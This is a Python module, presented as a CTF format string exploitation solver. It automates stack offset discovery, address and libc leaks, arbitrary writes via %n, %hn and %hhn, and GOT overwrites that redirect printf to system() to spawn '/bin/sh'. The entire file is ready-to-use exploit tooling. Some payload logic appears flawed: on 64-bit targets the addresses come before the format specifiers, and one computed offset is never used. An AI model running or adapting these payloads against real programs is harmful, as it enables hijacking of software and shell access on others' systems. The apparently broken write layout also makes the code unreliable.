"""
Format String Exploitation Solver for CTF Challenges

Provides automated format string vulnerability exploitation:
- Offset finding
- Memory leaking (addresses, canaries, etc.)
- Arbitrary write primitives
- GOT overwrite for shell execution
"""

import struct
import logging
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple, Callable, Union
from enum import Enum

logger = logging.getLogger(__name__)


class Architecture(Enum):
    """Target architecture."""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"


class WriteSize(Enum):
    """Size of format string writes."""
    BYTE = 1    # %hhn
    SHORT = 2   # %hn
    INT = 4     # %n
    LONG = 8    # %ln (64-bit)


@dataclass
class FormatStringPayload:
    """Represents a format string exploit payload."""
    payload: bytes
    description: str
    writes: List[Tuple[int, int]] = field(default_factory=list)  # (address, value) pairs
    leaked_addresses: List[int] = field(default_factory=list)

    def __str__(self) -> str:
        return self.payload.decode('latin-1', errors='replace')

    def hex(self) -> str:
        return self.payload.hex()


@dataclass
class LeakResult:
    """Result of a format string leak."""
    offset: int
    raw_value: bytes
    interpreted_value: int
    description: str = ""

    def as_pointer(self, arch: Architecture = Architecture.X64) -> int:
        """Interpret as a pointer value."""
        if arch == Architecture.X64:
            return struct.unpack("<Q", self.raw_value.ljust(8, b'\x00')[:8])[0]
        else:
            return struct.unpack("<I", self.raw_value.ljust(4, b'\x00')[:4])[0]


class FormatStringSolver:
    """
    Automated format string vulnerability exploitation.

    Supports:
    - Finding format string offset
    - Leaking stack/heap/libc addresses
    - Arbitrary read via %s
    - Arbitrary write via %n, %hn, %hhn
    - GOT overwrite chains
    """

    def __init__(self,
                 arch: Architecture = Architecture.X64,
                 send_func: Optional[Callable[[bytes], bytes]] = None):
        """
        Initialize format string solver.

        Args:
            arch: Target architecture
            send_func: Function to send payload and receive response
        """
        self.arch = arch
        self.send_func = send_func
        self.pointer_size = 8 if arch in (Architecture.X64, Architecture.ARM64) else 4
        self._offset_cache: Optional[int] = None

    def find_offset(self,
                   marker: bytes = b"AAAABBBB",
                   max_offset: int = 50,
                   send_func: Optional[Callable[[bytes], bytes]] = None) -> int:
        """
        Find the format string offset where our input appears on the stack.

        Args:
            marker: Unique marker to search for
            max_offset: Maximum offset to try
            send_func: Function to send payload and get response

        Returns:
            Stack offset where input appears
        """
        send = send_func or self.send_func
        if not send:
            raise ValueError("No send function provided")

        # Strategy 1: Use %p to leak stack and find our marker
        for offset in range(1, max_offset + 1):
            if self.pointer_size == 8:
                payload = marker + f"%{offset}$p".encode()
            else:
                payload = marker + f"%{offset}$x".encode()

            try:
                response = send(payload)

                # Check if response contains the marker as hex
                marker_hex = marker.hex()
                # For little-endian, bytes are reversed
                marker_le = marker[::-1].hex() if self.pointer_size == 4 else marker.hex()

                response_str = response.decode('latin-1', errors='replace').lower()

                if marker_hex.lower() in response_str or marker_le.lower() in response_str:
                    logger.info(f"Found offset: {offset}")
                    self._offset_cache = offset
                    return offset

                # Also check for partial matches (first 4 bytes for 32-bit)
                if self.pointer_size == 4:
                    marker_part = marker[:4].hex()
                    if marker_part.lower() in response_str:
                        logger.info(f"Found offset: {offset}")
                        self._offset_cache = offset
                        return offset

            except Exception as e:
                logger.debug(f"Offset {offset} failed: {e}")
                continue

        raise ValueError(f"Could not find offset within {max_offset} positions")

    def find_offset_manual(self) -> str:
        """
        Generate payload to manually find offset.

        Returns:
            Payload string to send for manual offset detection
        """
        # Generate pattern that's easy to identify
        payload = b"AAAA" if self.pointer_size == 4 else b"AAAAAAAA"

        # Add multiple %p to see stack values
        for i in range(1, 20):
            payload += f".%{i}$p".encode()

        return f"Send this payload and look for '41414141' (32-bit) or '4141414141414141' (64-bit):\n{payload.decode()}"

    def leak_address(self,
                    offset: int,
                    index: int = 0,
                    send_func: Optional[Callable[[bytes], bytes]] = None) -> LeakResult:
        """
        Leak a value from the stack at specified offset.

        Args:
            offset: Base offset where our input is
            index: Additional offset from base
            send_func: Function to send payload

        Returns:
            LeakResult with leaked value
        """
        send = send_func or self.send_func
        if not send:
            raise ValueError("No send function provided")

        target_offset = offset + index

        if self.pointer_size == 8:
            payload = f"%{target_offset}$p".encode()
        else:
            payload = f"%{target_offset}$x".encode()

        response = send(payload)

        # Parse response to extract leaked value
        response_str = response.decode('latin-1', errors='replace')

        # Find hex value in response (0x... or just hex digits)
        import re
        hex_match = re.search(r'0x([0-9a-fA-F]+)|([0-9a-fA-F]{8,16})', response_str)

        if hex_match:
            hex_val = hex_match.group(1) or hex_match.group(2)
            value = int(hex_val, 16)

            # Convert to bytes
            if self.pointer_size == 8:
                raw = struct.pack("<Q", value)
            else:
                raw = struct.pack("<I", value)

            return LeakResult(
                offset=target_offset,
                raw_value=raw,
                interpreted_value=value,
                description=f"Stack value at offset {target_offset}"
            )

        raise ValueError(f"Could not parse leaked value from response: {response_str[:100]}")

    def leak_stack(self,
                  offset: int,
                  count: int = 10,
                  send_func: Optional[Callable[[bytes], bytes]] = None) -> List[LeakResult]:
        """
        Leak multiple consecutive values from stack.

        Args:
            offset: Starting offset
            count: Number of values to leak
            send_func: Function to send payload

        Returns:
            List of LeakResults
        """
        results = []
        for i in range(count):
            try:
                result = self.leak_address(offset, i, send_func)
                results.append(result)
            except Exception as e:
                logger.warning(f"Failed to leak offset {offset + i}: {e}")

        return results

    def arbitrary_write(self,
                       address: int,
                       value: int,
                       offset: int,
                       write_size: WriteSize = WriteSize.BYTE) -> FormatStringPayload:
        """
        Generate payload for arbitrary write using format strings.

        Args:
            address: Target address to write to
            value: Value to write
            offset: Format string offset
            write_size: Size of each write (BYTE recommended for reliability)

        Returns:
            FormatStringPayload with the exploit payload
        """
        if write_size == WriteSize.BYTE:
            return self._arbitrary_write_bytes(address, value, offset)
        elif write_size == WriteSize.SHORT:
            return self._arbitrary_write_shorts(address, value, offset)
        else:
            return self._arbitrary_write_int(address, value, offset)

    def _arbitrary_write_bytes(self,
                               address: int,
                               value: int,
                               offset: int) -> FormatStringPayload:
        """
        Write value byte-by-byte using %hhn.

        Most reliable method as it handles byte ordering automatically.
        """
        # Determine number of bytes to write
        if self.pointer_size == 8:
            num_bytes = 8
            addr_fmt = "<Q"
        else:
            num_bytes = 4
            addr_fmt = "<I"

        # Only write non-zero bytes (or until we cover the value)
        value_bytes = []
        temp_val = value
        for i in range(num_bytes):
            byte_val = temp_val & 0xFF
            value_bytes.append((address + i, byte_val))
            temp_val >>= 8
            if temp_val == 0 and i >= 3:  # At least write 4 bytes for pointers
                break

        # Build payload: addresses first, then format specifiers
        addresses_part = b""
        format_part = ""

        # Calculate how many address slots we need
        num_addresses = len(value_bytes)

        # Pack addresses
        for addr, _ in value_bytes:
            addresses_part += struct.pack(addr_fmt, addr)

        # Calculate starting offset (account for address bytes)
        addr_slots = (len(addresses_part) + self.pointer_size - 1) // self.pointer_size
        current_offset = offset + addr_slots

        # Sort by value to minimize padding needed
        sorted_writes = sorted(enumerate(value_bytes), key=lambda x: x[1][1])

        written = 0
        writes_log = []

        for original_idx, (addr, byte_val) in sorted_writes:
            target_slot = offset + original_idx

            # Calculate padding needed
            needed = byte_val - (written % 256)
            if needed <= 0:
                needed += 256

            if needed > 0:
                format_part += f"%{needed}c"

            format_part += f"%{target_slot}$hhn"
            written += needed
            writes_log.append((addr, byte_val))

        payload = addresses_part + format_part.encode()

        return FormatStringPayload(
            payload=payload,
            description=f"Write {hex(value)} to {hex(address)} using %hhn",
            writes=writes_log
        )

    def _arbitrary_write_shorts(self,
                                address: int,
                                value: int,
                                offset: int) -> FormatStringPayload:
        """Write value using %hn (2 bytes at a time)."""
        if self.pointer_size == 8:
            addr_fmt = "<Q"
            num_shorts = 4
        else:
            addr_fmt = "<I"
            num_shorts = 2

        value_shorts = []
        temp_val = value
        for i in range(num_shorts):
            short_val = temp_val & 0xFFFF
            value_shorts.append((address + i * 2, short_val))
            temp_val >>= 16
            if temp_val == 0 and i >= 1:
                break

        addresses_part = b""
        for addr, _ in value_shorts:
            addresses_part += struct.pack(addr_fmt, addr)

        format_part = ""
        sorted_writes = sorted(enumerate(value_shorts), key=lambda x: x[1][1])

        written = 0
        writes_log = []

        for original_idx, (addr, short_val) in sorted_writes:
            target_slot = offset + original_idx

            needed = short_val - (written % 65536)
            if needed <= 0:
                needed += 65536

            if needed > 0:
                format_part += f"%{needed}c"

            format_part += f"%{target_slot}$hn"
            written += needed
            writes_log.append((addr, short_val))

        payload = addresses_part + format_part.encode()

        return FormatStringPayload(
            payload=payload,
            description=f"Write {hex(value)} to {hex(address)} using %hn",
            writes=writes_log
        )

    def _arbitrary_write_int(self,
                             address: int,
                             value: int,
                             offset: int) -> FormatStringPayload:
        """Write value using %n (4 bytes at a time)."""
        if self.pointer_size == 8:
            addr_fmt = "<Q"
        else:
            addr_fmt = "<I"

        addresses_part = struct.pack(addr_fmt, address)

        # Need to print exactly 'value' characters before %n
        if value > 0:
            format_part = f"%{value}c%{offset}$n"
        else:
            format_part = f"%{offset}$n"  # Write 0 (just the address bytes)

        payload = addresses_part + format_part.encode()

        return FormatStringPayload(
            payload=payload,
            description=f"Write {hex(value)} to {hex(address)} using %n",
            writes=[(address, value)]
        )

    def got_overwrite(self,
                     got_entry: int,
                     target_func: int,
                     offset: int) -> FormatStringPayload:
        """
        Generate GOT overwrite payload.

        Overwrites a GOT entry to redirect execution to target function
        (e.g., system() address).

        Args:
            got_entry: Address of GOT entry to overwrite
            target_func: Address to write (e.g., system)
            offset: Format string offset

        Returns:
            FormatStringPayload for GOT overwrite
        """
        payload = self.arbitrary_write(got_entry, target_func, offset, WriteSize.BYTE)
        payload.description = f"GOT overwrite: {hex(got_entry)} -> {hex(target_func)}"

        return payload

    def build_shell_payload(self,
                           printf_got: int,
                           system_addr: int,
                           offset: int,
                           command: bytes = b"/bin/sh\x00") -> Tuple[FormatStringPayload, bytes]:
        """
        Build complete payload for shell execution.

        Strategy: Overwrite printf GOT with system, then trigger printf with "/bin/sh"

        Args:
            printf_got: Address of printf in GOT
            system_addr: Address of system function
            offset: Format string offset
            command: Command to execute

        Returns:
            Tuple of (GOT overwrite payload, trigger payload)
        """
        overwrite_payload = self.got_overwrite(printf_got, system_addr, offset)
        trigger_payload = command

        return overwrite_payload, trigger_payload

    def generate_leak_chain(self,
                           offset: int,
                           positions: List[int]) -> bytes:
        """
        Generate payload to leak multiple stack positions at once.

        Args:
            offset: Base offset
            positions: List of relative positions to leak

        Returns:
            Payload bytes
        """
        parts = []
        for pos in positions:
            target = offset + pos
            parts.append(f"|%{target}$p|")

        return "".join(parts).encode()

    def calculate_libc_base(self,
                           leaked_addr: int,
                           known_offset: int) -> int:
        """
        Calculate libc base address from a leaked libc address.

        Args:
            leaked_addr: Address leaked from stack
            known_offset: Known offset in libc (e.g., __libc_start_main+X)

        Returns:
            Calculated libc base address
        """
        return leaked_addr - known_offset

    @staticmethod
    def common_libc_offsets() -> Dict[str, int]:
        """
        Return common libc function offsets for various versions.

        Note: These are examples - actual offsets depend on libc version.
        Use libc-database or pwntools' libc.search for accurate values.
        """
        return {
            "system_offset_hint": "Use: libc.symbols['system']",
            "binsh_offset_hint": "Use: next(libc.search(b'/bin/sh'))",
            "exit_offset_hint": "Use: libc.symbols['exit']",
            "puts_offset_hint": "Use: libc.symbols['puts']",
        }


# Convenience functions
def find_format_offset(send_func: Callable[[bytes], bytes],
                      arch: str = "x64",
                      marker: bytes = b"AAAABBBB") -> int:
    """
    Quick function to find format string offset.

    Args:
        send_func: Function to send payload and receive response
        arch: Architecture ("x86" or "x64")
        marker: Unique marker bytes

    Returns:
        Stack offset
    """
    architecture = Architecture.X64 if arch == "x64" else Architecture.X86
    solver = FormatStringSolver(arch=architecture, send_func=send_func)
    return solver.find_offset(marker)


def generate_write_payload(address: int,
                          value: int,
                          offset: int,
                          arch: str = "x64") -> bytes:
    """
    Quick function to generate arbitrary write payload.

    Args:
        address: Target address
        value: Value to write
        offset: Format string offset
        arch: Architecture

    Returns:
        Payload bytes
    """
    architecture = Architecture.X64 if arch == "x64" else Architecture.X86
    solver = FormatStringSolver(arch=architecture)
    result = solver.arbitrary_write(address, value, offset)
    return result.payload


def generate_got_overwrite(got_addr: int,
                          target_addr: int,
                          offset: int,
                          arch: str = "x64") -> bytes:
    """
    Quick function to generate GOT overwrite payload.

    Args:
        got_addr: GOT entry address
        target_addr: Address to write
        offset: Format string offset
        arch: Architecture

    Returns:
        Payload bytes
    """
    architecture = Architecture.X64 if arch == "x64" else Architecture.X86
    solver = FormatStringSolver(arch=architecture)
    result = solver.got_overwrite(got_addr, target_addr, offset)
    return result.payload
